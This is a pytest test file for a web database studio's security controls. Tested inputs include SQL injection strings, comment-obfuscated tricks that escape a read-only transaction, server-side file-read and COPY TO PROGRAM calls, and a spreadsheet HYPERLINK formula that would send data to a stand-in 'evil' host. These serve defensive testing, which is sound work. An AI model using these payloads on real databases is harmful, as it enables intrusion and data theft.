import csv
import io
import json
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit, urlunsplit

import pytest
from starlette.testclient import TestClient
from starlette.types import Receive, Scope, Send

from mizzle.core.errors import MigrationError, MizzleError
from mizzle.dialects.postgres import PostgresDialect
from mizzle.dialects.postgres.driver import PostgresDriver
from mizzle.kit.sqltext import split_statements
from mizzle.studio import server
from mizzle.studio.server import (
    _basic_credentials,
    create_app,
    parse_auth,
    resolve_token,
)

TOKEN = "test-token"
AUTH = {"Authorization": f"Bearer {TOKEN}"}
ROWS = "/api/tables/public/users/rows"
EXPORT = "/api/tables/public/users/export"


def make_client(
    pg_url: str,
    read_only: bool = False,
    static: Path | None = None,
    state_path: Path | None = None,
    basic_auth: tuple[str, str] | None = None,
    address: str = "testclient",
) -> TestClient:
    kwargs: dict[str, Any] = {}
    if static is not None:
        kwargs["static_dir"] = static
    if state_path is not None:
        kwargs["state_path"] = state_path
    if basic_auth is not None:
        kwargs["basic_auth"] = basic_auth
    app = create_app(
        dialect=PostgresDialect(),
        url=pg_url,
        schemas=["public"],
        token=TOKEN,
        allowed_hosts={"testserver"},
        read_only=read_only,
        **kwargs,
    )
    return TestClient(app, client=(address, 50000))


RO_ROLE = "mizzle_studio_ro"


@pytest.fixture
async def ro_url(pg_url: str, driver: PostgresDriver) -> str:
    """A plain (non-superuser) role that may write to the test tables.

    Read-only Studio refuses to start as a superuser (B18), and the role can write so the
    tests show that Studio's read-only mode, not a missing grant, stops the writes.
    """
    async with driver.acquire() as conn:
        await conn.execute(
            f"DO $$ BEGIN CREATE ROLE {RO_ROLE} LOGIN PASSWORD 'ro'; "
            "EXCEPTION WHEN duplicate_object THEN NULL; END $$",
            [],
        )
        await conn.execute(
            f"GRANT USAGE ON SCHEMA public TO {RO_ROLE}; "
            f"GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO {RO_ROLE}; "
            f"GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO {RO_ROLE}",
            [],
        )
    parts = urlsplit(pg_url)
    return urlunsplit(parts._replace(netloc=f"{RO_ROLE}:ro@{parts.hostname}:{parts.port}"))


def test_parse_auth_accepts_user_and_password() -> None:
    assert parse_auth("admin:secret") == ("admin", "secret")
    assert parse_auth("admin:pa:ss") == ("admin", "pa:ss")
    for bad in ("nocolon", "user:", ":pass"):
        with pytest.raises(MigrationError):
            parse_auth(bad)


def test_resolve_token_prefers_explicit_then_env(monkeypatch: pytest.MonkeyPatch) -> None:
    assert resolve_token("given") == "given"
    monkeypatch.setenv("MIZZLE_STUDIO_TOKEN", "from-env")
    assert resolve_token() == "from-env"
    assert resolve_token("given") == "given"  # explicit still wins
    monkeypatch.delenv("MIZZLE_STUDIO_TOKEN")
    token = resolve_token()
    assert token and token != "given"


def test_basic_auth_guards_the_api(pg_url: str, driver: PostgresDriver) -> None:
    with make_client(pg_url, basic_auth=("admin", "secret")) as client:
        unauthorized = client.get("/api/meta")
        assert unauthorized.status_code == 401
        assert unauthorized.headers["www-authenticate"] == 'Basic realm="mizzle studio"'

        wrong = client.get(
            "/api/meta", headers={"Authorization": _basic_credentials("admin", "nope").decode()}
        )
        assert wrong.status_code == 401

        good = client.get(
            "/api/meta", headers={"Authorization": _basic_credentials("admin", "secret").decode()}
        )
        assert good.status_code == 200
        assert good.json()["dialect"] == "postgresql"

        # The bearer token keeps working alongside Basic auth.
        assert client.get("/api/meta", headers=AUTH).status_code == 200


def test_split_statements_handles_quotes_and_comments() -> None:
    assert split_statements("select 1; select 2") == ["select 1", "select 2"]
    assert split_statements("select 'a;b'") == ["select 'a;b'"]
    assert split_statements('select "we;ird"') == ['select "we;ird"']
    assert split_statements("select $$a;b$$") == ["select $$a;b$$"]
    assert split_statements("select $tag$x;y$tag$") == ["select $tag$x;y$tag$"]
    assert split_statements("-- note;\nselect 1;") == ["-- note;\nselect 1"]
    assert split_statements("/* a;b */ select 1;") == ["/* a;b */ select 1"]
    assert split_statements("  ") == []
    assert split_statements("-- only a comment") == []


@pytest.fixture
def client(pg_url: str, driver: PostgresDriver) -> Iterator[TestClient]:
    with make_client(pg_url) as c:
        yield c


def test_requires_token_and_host(client: TestClient) -> None:
    assert client.get("/api/meta").status_code == 401
    assert client.get("/api/meta", headers={"Authorization": "Bearer nope"}).status_code == 401
    assert client.get("/api/meta", headers={**AUTH, "Host": "evil.example"}).status_code == 403
    response = client.get("/api/meta", headers=AUTH)
    assert response.json() == {"read_only": False, "dialect": "postgresql"}
    assert response.headers["x-frame-options"] == "DENY"
    assert "access-control-allow-origin" not in response.headers


def test_tables_lists_schema(client: TestClient) -> None:
    tables = client.get("/api/tables", headers=AUTH).json()["tables"]
    users = next(t for t in tables if t["name"] == "users")
    assert list(users["columns"]) == ["id", "email", "bio", "role", "created_at"]
    assert users["primary_key"]["columns"] == ["id"]


def test_relationships_endpoint(client: TestClient) -> None:
    data = client.get("/api/schema/relationships", headers=AUTH).json()
    nodes = {f"{t['schema']}.{t['name']}": t for t in data["tables"]}
    assert {"public.users", "public.posts"} <= set(nodes)
    assert "id" in nodes["public.users"]["columns"]

    edge = next(e for e in data["relationships"] if e["from_table"] == "posts")
    assert edge["from_schema"] == "public"
    assert edge["from_columns"] == ["author_id"]
    assert edge["to_table"] == "users" and edge["to_columns"] == ["id"]


def test_crud_flow(client: TestClient) -> None:
    created = client.post(ROWS, json={"values": {"email": "ann", "role": "admin"}}, headers=AUTH)
    assert created.status_code == 201, created.text
    row = created.json()["row"]
    assert row["email"] == "ann" and row["role"] == "admin"
    client.post(ROWS, json={"values": {"email": "bob"}}, headers=AUTH)

    page = client.get(ROWS, params={"limit": 1, "order": "email", "dir": "desc"}, headers=AUTH)
    assert page.json()["total"] == 2
    assert [r["email"] for r in page.json()["rows"]] == ["bob"]

    filters = '[{"column": "role", "op": "eq", "value": "admin"}]'
    filtered = client.get(ROWS, params={"filters": filters}, headers=AUTH).json()
    assert [r["email"] for r in filtered["rows"]] == ["ann"]
    like = '[{"column": "email", "op": "ilike", "value": "B%"}]'
    assert client.get(ROWS, params={"filters": like}, headers=AUTH).json()["total"] == 1

    updated = client.patch(
        ROWS, json={"key": {"id": row["id"]}, "values": {"bio": "hi"}}, headers=AUTH
    )
    assert updated.json()["row"]["bio"] == "hi"
    missing = client.patch(ROWS, json={"key": {"id": -1}, "values": {"bio": "x"}}, headers=AUTH)
    assert missing.status_code == 404

    deleted = client.request("DELETE", ROWS, json={"keys": [{"id": row["id"]}]}, headers=AUTH)
    assert deleted.json() == {"deleted": 1}


def test_names_are_checked_not_injected(client: TestClient) -> None:
    evil = '[{"column": "email\\" = \'\' OR 1=1 --", "op": "eq", "value": "x"}]'
    assert client.get(ROWS, params={"filters": evil}, headers=AUTH).status_code == 400
    assert (
        client.get(ROWS, params={"order": "id; DROP TABLE users"}, headers=AUTH).status_code == 400
    )
    bad_table = "/api/tables/public/users%3B%20DROP%20TABLE%20users/rows"
    assert client.get(bad_table, headers=AUTH).status_code == 404
    value = '[{"column": "email", "op": "eq", "value": "x\' OR \'1\'=\'1"}]'
    assert client.get(ROWS, params={"filters": value}, headers=AUTH).json()["total"] == 0


def test_sql_endpoint(client: TestClient) -> None:
    client.post(ROWS, json={"values": {"email": "ann"}}, headers=AUTH)
    result = client.post(
        "/api/sql",
        json={"sql": "select email, created_at, 1.5::numeric as n from users"},
        headers=AUTH,
    ).json()
    assert result["columns"] == ["email", "created_at", "n"]
    assert result["rows"][0][0] == "ann"
    assert result["rows"][0][2] == "1.5"
    error = client.post("/api/sql", json={"sql": "select nope"}, headers=AUTH)
    assert error.status_code == 400 and "nope" in error.json()["error"]


def test_bad_requests_are_reported(client: TestClient) -> None:
    bad_json = client.post(
        ROWS, content=b"not json", headers={**AUTH, "content-type": "application/json"}
    )
    assert bad_json.status_code == 400
    assert client.post(ROWS, json={"values": "x"}, headers=AUTH).status_code == 400
    assert (
        client.patch(ROWS, json={"key": {"id": 1}, "values": {}}, headers=AUTH).status_code == 400
    )
    wrong_key = client.patch(
        ROWS, json={"key": {"id": 1, "email": "a"}, "values": {"bio": "x"}}, headers=AUTH
    )
    assert wrong_key.status_code == 400
    assert client.request("DELETE", ROWS, json={"keys": []}, headers=AUTH).status_code == 400
    bad_op = '[{"column": "email", "op": "nope", "value": "x"}]'
    assert client.get(ROWS, params={"filters": bad_op}, headers=AUTH).status_code == 400
    assert client.get(ROWS, params={"limit": "-1"}, headers=AUTH).status_code == 400
    assert client.post("/api/sql", json={"sql": "  "}, headers=AUTH).status_code == 400
    assert client.put("/api/queries/saved/x", json={"sql": ""}, headers=AUTH).status_code == 400


def test_read_only_mode(ro_url: str) -> None:
    with make_client(ro_url, read_only=True) as client:
        assert client.post(ROWS, json={"values": {"email": "x"}}, headers=AUTH).status_code == 403
        assert (
            client.patch(ROWS, json={"key": {"id": 1}, "values": {}}, headers=AUTH).status_code
            == 403
        )
        write = client.post("/api/sql", json={"sql": "delete from users"}, headers=AUTH)
        assert write.status_code == 400
        assert "read-only" in write.json()["error"]
        assert (
            client.post("/api/sql", json={"sql": "select 1 as x"}, headers=AUTH).status_code == 200
        )


def test_serves_ui_without_token(pg_url: str, driver: PostgresDriver, tmp_path: Path) -> None:
    (tmp_path / "index.html").write_text("<!doctype html><title>studio</title>")
    with make_client(pg_url, static=tmp_path) as client:
        page = client.get("/")
        assert page.status_code == 200 and "studio" in page.text
        assert "default-src 'self'" in page.headers["content-security-policy"]


def test_export_csv_and_json(client: TestClient) -> None:
    client.post(ROWS, json={"values": {"email": "ann"}}, headers=AUTH)
    client.post(ROWS, json={"values": {"email": "bob"}}, headers=AUTH)

    csv_resp = client.get(EXPORT, params={"format": "csv", "order": "email"}, headers=AUTH)
    assert csv_resp.status_code == 200
    assert csv_resp.headers["content-type"].startswith("text/csv")
    disposition = csv_resp.headers["content-disposition"]
    assert 'filename="public.users.csv"' in disposition
    assert "filename*=UTF-8''public.users.csv" in disposition
    lines = csv_resp.text.strip().splitlines()
    assert lines[0].split(",") == ["id", "email", "bio", "role", "created_at"]
    assert "ann" in lines[1] and "bob" in lines[2]

    filters = '[{"column": "email", "op": "eq", "value": "ann"}]'
    js = client.get(EXPORT, params={"format": "json", "filters": filters}, headers=AUTH).json()
    assert [r["email"] for r in js] == ["ann"]
    assert client.get(EXPORT, params={"format": "xml"}, headers=AUTH).status_code == 400


def test_sql_console_runs_multiple_statements(client: TestClient) -> None:
    client.post(ROWS, json={"values": {"email": "ann"}}, headers=AUTH)
    result = client.post(
        "/api/sql",
        json={"sql": "select email from users; select count(*) as n from users"},
        headers=AUTH,
    ).json()
    assert [r["columns"] for r in result["results"]] == [["email"], ["n"]]
    assert result["results"][0]["rows"][0][0] == "ann"
    assert result["results"][1]["rows"][0][0] == 1
    assert "columns" not in result  # the flat shape is only for a single statement

    literal = client.post("/api/sql", json={"sql": "select 'a;b' as s"}, headers=AUTH).json()
    assert literal["rows"] == [["a;b"]] and len(literal["results"]) == 1
    assert literal["columns"] == ["s"]  # a single statement still mirrors the flat shape


def test_query_history_records_success_and_failure(client: TestClient) -> None:
    client.post("/api/sql", json={"sql": "select 1"}, headers=AUTH)
    client.post("/api/sql", json={"sql": "select nope"}, headers=AUTH)
    history = client.get("/api/queries/history", headers=AUTH).json()["history"]
    assert [h["sql"] for h in history] == ["select 1", "select nope"]
    assert [h["ok"] for h in history] == [True, False]
    cleared = client.request("DELETE", "/api/queries/history", headers=AUTH)
    assert cleared.json() == {"cleared": True}
    assert client.get("/api/queries/history", headers=AUTH).json()["history"] == []


def test_saved_queries_round_trip(client: TestClient) -> None:
    assert client.get("/api/queries/saved", headers=AUTH).json() == {"saved": []}
    created = client.put("/api/queries/saved/top", json={"sql": "select 1"}, headers=AUTH)
    assert created.status_code == 201
    assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == [
        {"name": "top", "sql": "select 1"}
    ]
    assert client.request("DELETE", "/api/queries/saved/nope", headers=AUTH).status_code == 404
    assert client.request("DELETE", "/api/queries/saved/top", headers=AUTH).json() == {
        "deleted": "top"
    }
    assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == []


def test_state_persists_between_runs(pg_url: str, driver: PostgresDriver, tmp_path: Path) -> None:
    state = tmp_path / "studio.json"
    with make_client(pg_url, state_path=state) as client:
        client.put("/api/queries/saved/top", json={"sql": "select 42"}, headers=AUTH)
        client.post("/api/sql", json={"sql": "select 1"}, headers=AUTH)
    assert state.exists()
    with make_client(pg_url, state_path=state) as client:
        assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == [
            {"name": "top", "sql": "select 42"}
        ]
        history = client.get("/api/queries/history", headers=AUTH).json()["history"]
        assert history[-1]["sql"] == "select 1"


DDL_PREVIEW = "/api/ddl/preview"
DDL_APPLY = "/api/ddl/apply"


def test_ddl_preview_and_apply(client: TestClient) -> None:
    client.post("/api/sql", json={"sql": "drop table if exists st_notes"}, headers=AUTH)
    create = {
        "operation": "create_table",
        "schema": "public",
        "name": "st_notes",
        "columns": [
            {"name": "id", "type": "integer", "primary_key": True},
            {"name": "title", "type": "text", "not_null": True},
        ],
    }
    preview = client.post(DDL_PREVIEW, json=create, headers=AUTH)
    assert preview.status_code == 200, preview.text
    assert preview.json()["statements"] == [
        {
            "sql": (
                'CREATE TABLE "st_notes" (\n'
                '    "id" integer,\n'
                '    "title" text NOT NULL,\n'
                '    CONSTRAINT "st_notes_pkey" PRIMARY KEY ("id")\n'
                ")"
            ),
            "description": "create table st_notes",
            "data_loss": False,
        }
    ]

    applied = client.post(DDL_APPLY, json=create, headers=AUTH)
    assert applied.status_code == 200 and applied.json()["applied"] == 1
    tables = client.get("/api/tables", headers=AUTH).json()["tables"]
    assert any(t["name"] == "st_notes" for t in tables)

    add = {
        "operation": "add_column",
        "schema": "public",
        "table": "st_notes",
        "name": "body",
        "column": {"name": "body", "type": "text"},
    }
    client.post(DDL_APPLY, json=add, headers=AUTH)
    notes = next(
        t
        for t in client.get("/api/tables", headers=AUTH).json()["tables"]
        if t["name"] == "st_notes"
    )
    assert "body" in notes["columns"]

    # An existing table or column is refused, and bad operations never reach SQL.
    assert client.post(DDL_APPLY, json=create, headers=AUTH).status_code == 400
    bad = {
        "operation": "add_column",
        "schema": "public",
        "table": "st_notes",
        "name": "x",
        "column": {"name": "x", "type": "text; drop table users"},
    }
    assert client.post(DDL_PREVIEW, json=bad, headers=AUTH).status_code == 400
    assert (
        client.post(
            DDL_PREVIEW, json={"operation": "truncate", "name": "x"}, headers=AUTH
        ).status_code
        == 400
    )

    dropped = client.post(
        DDL_APPLY,
        json={"operation": "drop_table", "schema": "public", "name": "st_notes"},
        headers=AUTH,
    )
    assert dropped.json()["applied"] == 1
    assert not any(
        t["name"] == "st_notes" for t in client.get("/api/tables", headers=AUTH).json()["tables"]
    )


def test_ddl_preview_works_but_apply_is_blocked_read_only(ro_url: str) -> None:
    op = {
        "operation": "create_table",
        "schema": "public",
        "name": "st_ro",
        "columns": [{"name": "id", "type": "integer"}],
    }
    with make_client(ro_url, read_only=True) as client:
        assert client.post(DDL_PREVIEW, json=op, headers=AUTH).status_code == 200
        assert client.post(DDL_APPLY, json=op, headers=AUTH).status_code == 403


def test_read_only_refuses_transaction_control(pg_url: str, ro_url: str) -> None:
    # SS1: a COMMIT / ROLLBACK / SET in the middle of a batch used to end the READ ONLY
    # transaction, so the statements after it ran read-write.
    with make_client(pg_url) as writable:  # seed outside read-only: it refuses writes
        writable.post(ROWS, json={"values": {"email": "victim"}}, headers=AUTH)
    with make_client(ro_url, read_only=True) as client:
        for sql in (
            "select 1; commit; insert into users (email) values ('x')",
            "set transaction_read_only = off; insert into users (email) values ('x')",
            "rollback; begin; insert into users (email) values ('x'); commit",
            "savepoint s; insert into users (email) values ('x')",
            "/* a comment */ commit",
            # B17: PostgreSQL ends a -- comment at \r too, and nests /* */ comments.
            "--x\rcommit\n; insert into users (email) values ('cr')",
            "/* /* */ x */ commit; insert into users (email) values ('nested')",
            "/* /* */ */ rollback\n; insert into users (email) values ('nested2')",
            "/* /* */ */ set transaction_read_only = off",
            "-- a\r/* b /* c */ d */\n\t commit",
            # B65, B66: a comment between the two words made the transaction writable.
            "start/**/transaction read write; insert into users (email) values ('start')",
            "start--\ntransaction isolation level read committed, read write; "
            "update users set email = 'pwn'",
            "prepare/**/transaction 'x'; insert into users (email) values ('prep')",
            # B70: allowed in a READ ONLY transaction, but rewrite or lock tables.
            "cluster users using users_pkey",
            "reindex table users",
            "analyze users",
        ):
            response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
            assert response.status_code == 403, (sql, response.text)
        emails = client.post(
            "/api/sql", json={"sql": "select email from users order by id"}, headers=AUTH
        ).json()["rows"]
        assert emails == [["victim"]]


def test_read_only_checks_each_split_statement(pg_url: str, driver: PostgresDriver) -> None:
    # The check runs on the statements split_statements produced, so a COPY after a
    # harmless SELECT is caught; smoke-testing the raw text would miss it.
    from mizzle.studio.server import _reject_read_only

    statements = split_statements("select 1; copy (select 1) to program 'true'")
    assert len(statements) == 2
    with pytest.raises(Exception, match="COPY"):
        _reject_read_only(statements)


def test_read_only_allows_queries_that_mention_blocked_words(
    pg_url: str, driver: PostgresDriver
) -> None:
    # The blocklist is anchored at the statement start, so data and identifiers are fine.
    from mizzle.studio.server import _reject_read_only

    for sql in (
        "select 'set up' as note",
        "select * from settings",
        "select name from t where name = 'commit'",
        "select notify_at from jobs",
    ):
        _reject_read_only([sql])


def test_read_only_refuses_server_side_calls(ro_url: str) -> None:
    # SS2: defence in depth only; the role check (B18) is the control.
    with make_client(ro_url, read_only=True) as client:
        for sql in (
            "select pg_read_file('/etc/hostname')",
            "select pg_terminate_backend(1)",
            "copy (select 1) to program 'true'",
            "do $$ begin end $$",
            "notify chan",
            # B18: bypasses found by the verifier.
            "select pg_notify('ch', 'x')",
            "select pg_create_physical_replication_slot('verifyslot', true)",
            "select pg_ls_waldir()",
            "checkpoint",
            "load 'auto_explain'",
            "select U&\"pg\\005Fread_file\"('/etc/hostname')",
            "select query_to_xml('select 1', true, false, '')",
        ):
            response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
            assert response.status_code == 403, (sql, response.text)


def test_read_only_refuses_a_privileged_role(pg_url: str, ro_url: str) -> None:
    # B18: a text blocklist cannot stop a superuser, so read-only Studio refuses to start.
    with pytest.raises(MigrationError, match="superuser"), make_client(pg_url, read_only=True):
        pass
    # Membership in a role with server-side abilities is refused the same way.
    with make_client(pg_url) as admin:
        admin.post("/api/sql", json={"sql": f"grant pg_signal_backend to {RO_ROLE}"}, headers=AUTH)
        try:
            with (
                pytest.raises(MigrationError, match="pg_signal_backend"),
                make_client(ro_url, read_only=True),
            ):
                pass
        finally:
            sql = f"revoke pg_signal_backend from {RO_ROLE}"
            admin.post("/api/sql", json={"sql": sql}, headers=AUTH)
    # A writable Studio is not limited: the role check is about the read-only promise.
    with make_client(pg_url) as client:
        assert client.get("/api/meta", headers=AUTH).status_code == 200


async def test_privileged_roles_for_the_cli_check(pg_url: str, ro_url: str) -> None:
    # The start-up check `mizzle studio --read-only` runs before serving (B18).
    assert "mizzle (superuser)" in await server.privileged_roles(PostgresDialect(), pg_url)
    assert await server.privileged_roles(PostgresDialect(), ro_url) == []
    with pytest.raises(MizzleError, match="could not connect"):  # the CLI prints it
        await server.privileged_roles(PostgresDialect(), "postgresql://x@127.0.0.1:1/x")


def test_cross_site_post_is_refused(pg_url: str, driver: PostgresDriver) -> None:
    # SS3: browsers attach cached Basic credentials to a cross-site form post.
    with make_client(pg_url, basic_auth=("admin", "pw")) as client:
        basic = {"Authorization": _basic_credentials("admin", "pw").decode()}
        ok = client.post("/api/sql", json={"sql": "select 1"}, headers=basic)
        assert ok.status_code == 200
        cross = client.post(
            "/api/sql",
            json={"sql": "select 1"},
            headers={**basic, "Origin": "https://evil.example"},
        )
        assert cross.status_code == 403
        site = client.post(
            "/api/sql",
            json={"sql": "select 1"},
            headers={**basic, "Sec-Fetch-Site": "cross-site"},
        )
        assert site.status_code == 403
        form = client.post(
            "/api/sql",
            content='{"sql": "select 1"}',
            headers={**basic, "Content-Type": "text/plain"},
        )
        assert form.status_code == 415


def test_error_responses_keep_the_security_headers(pg_url: str, driver: PostgresDriver) -> None:
    # SS4: a 401 never reached call_next, so it skipped CSP and friends.
    with make_client(pg_url) as client:
        response = client.get("/api/meta")
        assert response.status_code == 401
        assert response.headers["x-frame-options"] == "DENY"
        assert "default-src 'self'" in response.headers["content-security-policy"]


def test_csv_export_neutralizes_formulas(client: TestClient) -> None:
    # SS5: a cell starting with =, +, - or @ runs as a formula in a spreadsheet.
    client.post(
        ROWS, json={"values": {"email": '=HYPERLINK("http://evil/?"&A1,"x")'}}, headers=AUTH
    )
    client.post(ROWS, json={"values": {"email": "+1+cmd"}}, headers=AUTH)
    client.post(ROWS, json={"values": {"email": "@SUM(1)"}}, headers=AUTH)
    text = client.get(EXPORT, params={"format": "csv"}, headers=AUTH).text
    rows = list(csv.reader(io.StringIO(text)))
    assert [row[1] for row in rows[1:]] == [
        '\'=HYPERLINK("http://evil/?"&A1,"x")',
        "'+1+cmd",
        "'@SUM(1)",
    ]
    # JSON is typed data, not a spreadsheet cell: it is left alone.
    js = client.get(EXPORT, params={"format": "json"}, headers=AUTH).json()
    assert js[0]["email"].startswith("=")


def test_csv_export_keeps_signed_values_and_catches_padded_formulas(
    client: TestClient,
) -> None:
    # B19: numbers and intervals are data, not formulas: -5 must not export as '-5. A
    # formula behind leading whitespace is still a formula.
    client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_csv; "
            "create table st_csv (id int primary key, n int, d numeric, i interval, s text); "
            "insert into st_csv values (1, -5, -1.5, '-1 day', ' =1+1'), "
            "(2, 3, 2, '1 day', E'\\n=cmd'), (3, -1, -2, '-2 hours', '-2+3')"
        },
        headers=AUTH,
    )
    text = client.get(
        "/api/tables/public/st_csv/export", params={"format": "csv", "order": "id"}, headers=AUTH
    ).text
    rows = list(csv.reader(io.StringIO(text)))
    assert rows[1:] == [
        ["1", "-5", "-1.5", "-1 days", "' =1+1"],
        ["2", "3", "2", "1 day", "'\n=cmd"],
        ["3", "-1", "-2", "-02:00:00", "'-2+3"],
    ]


def test_ddl_is_limited_to_the_configured_schemas(pg_url: str, driver: PostgresDriver) -> None:
    # SF2: information_schema is a plain identifier, so only the schema filter stops it.
    with make_client(pg_url) as client:
        response = client.post(
            "/api/ddl/preview",
            json={
                "operation": "create_table",
                "schema": "information_schema",
                "name": "sneaky",
                "columns": [{"name": "id", "type": "integer"}],
            },
            headers=AUTH,
        )
        assert response.status_code == 403
        assert "schema filter" in response.json()["error"]


def test_ddl_type_allow_list_rejects_constraint_clauses(
    pg_url: str, driver: PostgresDriver
) -> None:
    # SF1: "int references victim on delete cascade" used to be a valid type.
    import mizzle.studio.ddl as ddl

    for bad in (
        "int references victim on delete cascade",
        "int primary key",
        "int unique",
        "int generated always as identity",
    ):
        assert not ddl._TYPE.fullmatch(bad), bad
    for good in ("integer", "varchar(255)", "numeric(10,2)", "timestamp with time zone"):
        assert ddl._TYPE.fullmatch(good), good
    assert not ddl._DEFAULT.fullmatch("0::int unique")


def test_ddl_type_and_default_grammar_accepts_valid_postgres() -> None:
    # B22: SF1 made the grammar too strict for valid types and defaults.
    import mizzle.studio.ddl as ddl

    for good in (
        "timestamp(3) with time zone",
        "timestamp(6) without time zone",
        "time with time zone",
        "time(2) without time zone",
        "interval",
        "interval(3)",
        "interval day to second",
        "interval day to second(3)",
        "interval year to month",
        "interval hour",
        "interval minute to second",
        '"MyType"',
        'public."MyType"',
        '"my schema"."My Type"[]',
        "double precision[]",
        "character varying(20)",
        "int[3]",
    ):
        assert ddl._TYPE.fullmatch(good), good
    for bad in (
        "int references victim",
        '"MyType" references victim',
        "timestamp with time zone primary key",
        "interval day to second unique",
        "int check (true)",
        'text collate "C"',
        "int default 1",
        "int generated always as (1) stored",
        "int not null",
        "int null",
        "int constraint c check (true)",
        "interval day to week",
        '"a"; drop table users',
    ):
        assert not ddl._TYPE.fullmatch(bad), bad
    for good in (
        "now() + interval '1 day'",
        "now() - interval '2 hours'",
        "nextval('seq'::regclass)",
        "nextval('public.\"Seq\"'::regclass)",
        "'2026-01-01'::timestamp(3) with time zone",
        "'P1D'::interval day to second",
        "0::int",
        "1 - -1",
    ):
        assert ddl._DEFAULT.fullmatch(good), good
    for bad in (
        "0::int unique",
        "now() references victim",
        "now() + interval '1 day' not null",
        "'x'::text collate \"C\"",
        "1--1",
        "1 - -- comment",
        "nextval('s')::regclass primary key",
        "now() /* x */",
        "0::int check (true)",
        "0 constraint c",
    ):
        assert not ddl._DEFAULT.fullmatch(bad), bad


def test_ddl_editor_creates_columns_with_the_wider_grammar(client: TestClient) -> None:
    client.post("/api/sql", json={"sql": "drop table if exists st_types"}, headers=AUTH)
    client.post("/api/sql", json={"sql": "drop sequence if exists st_seq"}, headers=AUTH)
    client.post("/api/sql", json={"sql": "create sequence st_seq"}, headers=AUTH)
    op = {
        "operation": "create_table",
        "schema": "public",
        "name": "st_types",
        "columns": [
            {"name": "id", "type": "bigint", "default": "nextval('st_seq'::regclass)"},
            {
                "name": "at",
                "type": "timestamp(3) with time zone",
                "default": "now() + interval '1 day'",
            },
            {"name": "span", "type": "interval day to second"},
        ],
    }
    applied = client.post(DDL_APPLY, json=op, headers=AUTH)
    assert applied.status_code == 200, applied.text


async def test_export_filename_survives_odd_table_names(
    pg_url: str, driver: PostgresDriver
) -> None:
    # SF3: a non-Latin-1 name raised UnicodeEncodeError (500) and a quote broke the header.
    async with driver.acquire() as conn:
        await conn.execute('DROP TABLE IF EXISTS public."café"', [])
        await conn.execute('DROP TABLE IF EXISTS public."q""uote"', [])
        await conn.execute('CREATE TABLE public."café" (id int)', [])
        # The identifier contains a literal double quote: doubled inside a quoted name.
        await conn.execute('CREATE TABLE public."q""uote" (id int)', [])
    with make_client(pg_url) as client:
        latin = client.get("/api/tables/public/café/export", headers=AUTH)
        assert latin.status_code == 200
        assert "filename*=UTF-8''public.caf%C3%A9.csv" in latin.headers["content-disposition"]
        quoted = client.get("/api/tables/public/q%22uote/export", headers=AUTH)
        assert quoted.status_code == 200
        assert 'filename="public.q_uote.csv"' in quoted.headers["content-disposition"]


def test_export_has_no_row_cap(pg_url: str, driver: PostgresDriver) -> None:
    # SF3: the export was capped at 100,000 rows with no indication, and built in memory.
    # The rows now come from a streaming cursor, so there is no cap and no LIMIT to lose.
    with make_client(pg_url) as client:
        for i in range(15):
            client.post(ROWS, json={"values": {"email": f"user{i}@x"}}, headers=AUTH)
        csv_text = client.get(EXPORT, params={"format": "csv"}, headers=AUTH).text
        assert len(csv_text.strip().splitlines()) == 16  # header + 15
        js = client.get(EXPORT, params={"format": "json"}, headers=AUTH).json()
        assert len(js) == 15

    # Nothing in the export path adds a LIMIT (the old 100,000 cap).
    import inspect

    source = inspect.getsource(server.export_rows)
    assert "LIMIT" not in source.upper().replace("LIMIT_", "")


def test_saved_query_names_may_contain_slashes(client: TestClient) -> None:
    # SF5: the name is a label, not a path, and "/" used to answer 405.
    created = client.put("/api/queries/saved/reports/top", json={"sql": "select 1"}, headers=AUTH)
    assert created.status_code == 201
    assert created.json() == {"name": "reports/top"}
    assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == [
        {"name": "reports/top", "sql": "select 1"}
    ]
    deleted = client.request("DELETE", "/api/queries/saved/reports/top", headers=AUTH)
    assert deleted.json() == {"deleted": "reports/top"}


def test_splitter_handles_escapes_and_nested_comments() -> None:
    # SF4: E'it\'s' and /* /* */ */ are valid SQL and must not split early.
    assert split_statements("select E'it\\'s; x' as s; select 2") == [
        "select E'it\\'s; x' as s",
        "select 2",
    ]
    assert split_statements("select 1; /* a /* nested ; */ still comment */ select 2") == [
        "select 1",
        "/* a /* nested ; */ still comment */ select 2",
    ]
    # A plain '...' has no backslash escape, so a backslash stays literal.
    assert split_statements("select 'a\\\\'; select 2") == ["select 'a\\\\'", "select 2"]


def test_splitter_reads_identifiers_and_comments_like_postgres() -> None:
    # B20: $b$ inside an identifier is not a dollar quote; \r ends a -- comment.
    assert split_statements("select 1 as a$b$; select 2") == ["select 1 as a$b$", "select 2"]
    assert split_statements("select 1 as é$b$; select 2") == ["select 1 as é$b$", "select 2"]
    assert split_statements("select 1 --x\r; select 2\n") == ["select 1 --x", "select 2"]
    assert split_statements("select $é$a;b$é$") == ["select $é$a;b$é$"]
    # A chunk of only comments is not a statement, whatever the comment style.
    assert split_statements("select 1; /* only */ -- also\r") == ["select 1"]


def test_repeated_failed_logins_are_throttled_per_client(
    pg_url: str, driver: PostgresDriver, monkeypatch: pytest.MonkeyPatch
) -> None:
    # SS4: a remote bind is reachable from anywhere, so a guessed token must not be
    # brute-forceable at network speed. B7: the throttle is per client, so an attacker
    # cannot lock the real user out. B34: a throttled client is refused even with the right
    # credential; otherwise the throttle did not slow guessing at all (a hit still got 200).
    monkeypatch.setattr(server, "LOGIN_MAX_FAILURES", 3)
    wrong = {"Authorization": "Bearer no"}
    with (
        make_client(pg_url, address="10.0.0.66") as attacker,
        make_client(pg_url, address="10.0.0.7") as user,
    ):
        for guess in range(3):
            response = attacker.get("/api/meta", headers={"Authorization": f"Bearer {guess}"})
            assert response.status_code == 401
        blocked = attacker.get("/api/meta", headers=wrong)
        assert blocked.status_code == 429
        assert int(blocked.headers["retry-after"]) >= 1
        # A correct guess from the throttled client is refused too.
        assert attacker.get("/api/meta", headers=AUTH).status_code == 429
        # Another client is not affected by the attacker's failures...
        assert user.get("/api/meta", headers=AUTH).status_code == 200
        assert user.get("/api/meta", headers=wrong).status_code == 401
        # ...and its successes do not reset the attacker's count.
